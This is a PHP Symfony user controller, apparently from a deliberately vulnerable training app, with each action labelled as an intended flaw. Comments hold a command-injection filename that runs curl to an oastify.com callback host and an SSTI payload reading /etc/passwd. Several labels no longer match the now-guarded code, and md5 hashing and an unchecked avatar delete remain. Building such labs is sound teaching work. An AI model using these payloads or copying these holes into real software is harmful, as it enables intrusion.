<?php

namespace App\Controller;

use App\Entity\User;
use App\Repository\UserRepository;
use App\Services\Avatar;
use Doctrine\ORM\EntityManagerInterface;
use Symfony\Bundle\FrameworkBundle\Controller\AbstractController;
use Symfony\Component\HttpFoundation\Request;
use Symfony\Component\HttpFoundation\Response;
use Symfony\Component\Routing\Attribute\Route;
use Symfony\Component\Security\Http\Attribute\CurrentUser;

class UserController extends AbstractController
{
    #[Route('/user', name: 'app_user')]
    public function index(
        #[CurrentUser] ?User $user,
    ): Response
    {
        return $this->render('user/index.html.twig', [
            'user' => $user,
        ]);
    }

    /**
     * #VULNERABILITY: Intended vulnerable request (Missing right control)
     */
    #[Route('/user/password/{user}', name: 'app_user_password', methods: ['POST'])]
    public function changePassword(User $user, Request $request, UserRepository $userRepository): Response
    {
        if ($user !== $this->getUser()) {
            $this->addFlash('error', 'You cannot change other users password');
            return $this->redirectToRoute('app_user');
	}
        $password = $request->get('newPassword');
        $confirmPassword = $request->get('confirmPassword');

        if ($password !== $confirmPassword) {
            $this->addFlash('error', 'Passwords do not match');
            return $this->redirectToRoute('app_user');
        }

        $user->setPassword(md5($password));

        $userRepository->save($user, true);

        $this->addFlash('success', 'Password changed successfully');
        return $this->redirectToRoute('app_user');
    }

    /**
     * #VULNERABILITY: Intended vulnerable request (Missing right control leading to privilege escalation)
     */
    #[Route('/user/email/{user}', name: 'app_user_email', methods: ['POST'])]
    public function changeEmail(User $user, Request $request, UserRepository $userRepository): Response
    {
        if ($user !== $this->getUser()) {
           $this->addFlash('error', 'You cannot change other users email');
           return $this->redirectToRoute('app_user');
        }

        $email = $request->get('newEmail');

        if (!filter_var($email, FILTER_VALIDATE_EMAIL)) {
            $this->addFlash('error', 'Emails is not valid');
            return $this->redirectToRoute('app_user');
        }

        $user->setEmail($email);
        $userRepository->save($user, true);

        $this->addFlash('success', 'Email changed successfully');
        return $this->redirectToRoute('app_user');
    }

    /**
     * #VULNERABILITY: Intended vulnerable request (File Upload - No extension check)
     */
    #[Route('/user/avatar/{user}', name: 'app_user_avatar', methods: ['POST'])]
    public function uploadAvatar(Request $request, UserRepository $userRepository, User $user): Response
    {
        if ($user !== $this->getUser()) {
            $this->addFlash('error', 'You cannot change other users avatar');
            return $this->redirectToRoute('app_user');
        }

        // If the avatar file already exists, delete it
        if (!empty($user->getAvatar()) && file_exists($this->getParameter('avatars_directory') . '/' . $user->getAvatar())) {
            unlink($this->getParameter('avatars_directory') . '/' . $user->getAvatar());
        }

        $avatar = $request->files->get('avatar');

        if (empty($avatar)) {
            $this->addFlash('error', 'Avatar cannot be empty');
            return $this->redirectToRoute('app_user');
        }


        // If the avatar directory does not exist, create it
        if (!file_exists($this->getParameter('avatars_directory'))) {
            mkdir($this->getParameter('avatars_directory'));
        }

        $allowedMimes = ['image/jpeg', 'image/png', 'image/gif', 'image/webp'];
	$allowedExtensions = ['jpg', 'jpeg', 'png', 'gif', 'webp'];

	if (!in_array($avatar->getMimeType(), $allowedMimes)) {
    	    $this->addFlash('error', 'File type not allowed. Only images are accepted.');
    	    return $this->redirectToRoute('app_user');
	}

	$extension = strtolower($avatar->getClientOriginalExtension());
	if (!in_array($extension, $allowedExtensions)) {
            $this->addFlash('error', 'File extension not allowed.');
    	    return $this->redirectToRoute('app_user');
	}

	$avatarName = md5(uniqid()) . '.' . $extension;
	$avatar->move($this->getParameter('avatars_directory'), $avatarName);

        $user->setAvatar($avatarName);
        $userRepository->save($user, true);

        $this->addFlash('success', 'Avatar changed successfully');
        return $this->redirectToRoute('app_user');
    }

    /**
     * #VULNERABILITY: Intended vulnerable request (SSRF - Server Side Request Forgery)
     */
    #[Route('/user/avatar/url/{user}', name: 'app_user_url_avatar', methods: ['POST'])]
    public function getAvatarFromUrl(
        Request $request,
        UserRepository $userRepository,
        User $user,
        Avatar $avatarService
    ): Response {
        if ($user !== $this->getUser()) {
            $this->addFlash('error', 'You cannot change other users avatar');
            return $this->redirectToRoute('app_user');
        }

        $url = $request->get('url');
        // Validation anti-SSRF
	$parsed = parse_url($url);
	$host = $parsed['host'] ?? '';
	$scheme = $parsed['scheme'] ?? '';

	if (!in_array($scheme, ['http', 'https'])) {
    	   $this->addFlash('error', 'URL scheme not allowed');
    	   return $this->redirectToRoute('app_user');
        }
	if (preg_match('/^(127\.|10\.|192\.168\.|172\.(1[6-9]|2[0-9]|3[01])\.|localhost)/i', $host)) {
    	   $this->addFlash('error', 'Internal URLs are not allowed');
           return $this->redirectToRoute('app_user');
        }
        if (empty($url)) {
            $this->addFlash('error', 'URL cannot be empty');
            return $this->redirectToRoute('app_user');
        }
        // Get the content of the URL
        $content = $avatarService->getFromUrl($url);

        if ($content === false) {
            $this->addFlash('error', 'URL is not valid or cannot be reached');
            return $this->redirectToRoute('app_user');
        }

        // Get the file extension
        $avatarName = md5(uniqid()) . '.png';
        file_put_contents($this->getParameter('avatars_directory') . '/' . $avatarName, $content);

        $user->setAvatar($avatarName);
        $userRepository->save($user, true);

        $this->addFlash('success', 'Avatar changed successfully');
        return $this->redirectToRoute('app_user');
    }

    /**
     * #VULNERABILITY: Intended vulnerable request (Missing right control)
     */
    #[Route('/user/avatar/delete/{user}', name: 'app_user_avatar_delete', methods: ['GET'])]
    public function deleteAvatar(User $user, UserRepository $userRepository): Response
    {
        if (empty($user->getAvatar())) {
            $this->addFlash('error', 'No avatar to delete');
            return $this->redirectToRoute('app_user');
        }

        unlink($this->getParameter('avatars_directory') . '/' . $user->getAvatar());

        $user->setAvatar(null);
        $userRepository->save($user, true);

        $this->addFlash('success', 'Avatar deleted successfully');
        return $this->redirectToRoute('app_user');
    }

    /**
     *  #VULNERABILITY: Intended vulnerable request (Command injection)
     *
     * Content-Disposition: form-data; name="avatar"; filename="echo.php;php -r '$sl=chr(47);$dot=chr(46);echo shell_exec(\"curl 547om5ntdolqiea4gzy8rj8jpav1jr7g${dot}oastify${dot}com\");';#"
     * Content-Type: application/x-php
     *
     * <?php echo "Test"; ?>
     */

    #[Route('/user/avatar/resize/{user}', name: 'app_user_avatar_resize', methods: ['GET'])]
    public function resizeAvatar(User $user): Response
    {
        if ($user !== $this->getUser()) {
            $this->addFlash('error', 'You cannot change other users avatar');
            return $this->redirectToRoute('app_user');
        }

        $avatar = $user->getAvatar();

        if (empty($avatar)) {
            $this->addFlash('error', 'No avatar to resize');
            return $this->redirectToRoute('app_user');
        }

	$avatarFile = $this->getParameter('avatars_directory') . '/' . basename($avatar);
	$command = 'convert ' . escapeshellarg($avatarFile) . ' -resize 200x200 ' . escapeshellarg($avatarFile);
	shell_exec($command);

        shell_exec($command);

        $this->addFlash('success', 'Avatar resized successfully');
        return $this->redirectToRoute('app_user');
    }

    /**
     *  #VULNERABILITY: Intended vulnerable request (SSTI)
     *
     * Payload example: {{'/etc/passwd'|file_excerpt(1,30)}}
     */
    #[Route('/user/about/', name: 'app_user_about', methods: ['POST'])]
    public function about(
        Request $request,
        EntityManagerInterface $entityManager,
        #[CurrentUser] ?User $user
    ): Response
    {
        $about = htmlspecialchars($request->get('about'), ENT_QUOTES, 'UTF-8');
	$user->setAboutMe($about);
        $entityManager->flush();

        $this->addFlash('success', 'About changed successfully');
        return $this->redirectToRoute('app_user');
    }

    #[Route('/user/edit/', name: 'app_user_edit_form', methods: ['GET'])]
    public function editForm(
        #[CurrentUser] ?User $user,
    ): Response
    {
        return $this->render('user/edit.html.twig', ['user' => $user]);
    }

    /**
     * #VULNERABILITY: Intended vulnerable request (Mass Assignment)
     */
    #[Route('/user/edit/', name: 'app_user_edit', methods: ['POST'])]
    public function edit(
        Request $request,
        EntityManagerInterface $entityManager,
        #[CurrentUser] ?User $user
    ): Response
    {
        $user->setFirstName($request->request->get('firstName'));
	$user->setLastName($request->request->get('lastName'));

        $entityManager->flush();

        $this->addFlash('success', 'User changed successfully');
        return $this->redirectToRoute('app_user');
    }

}
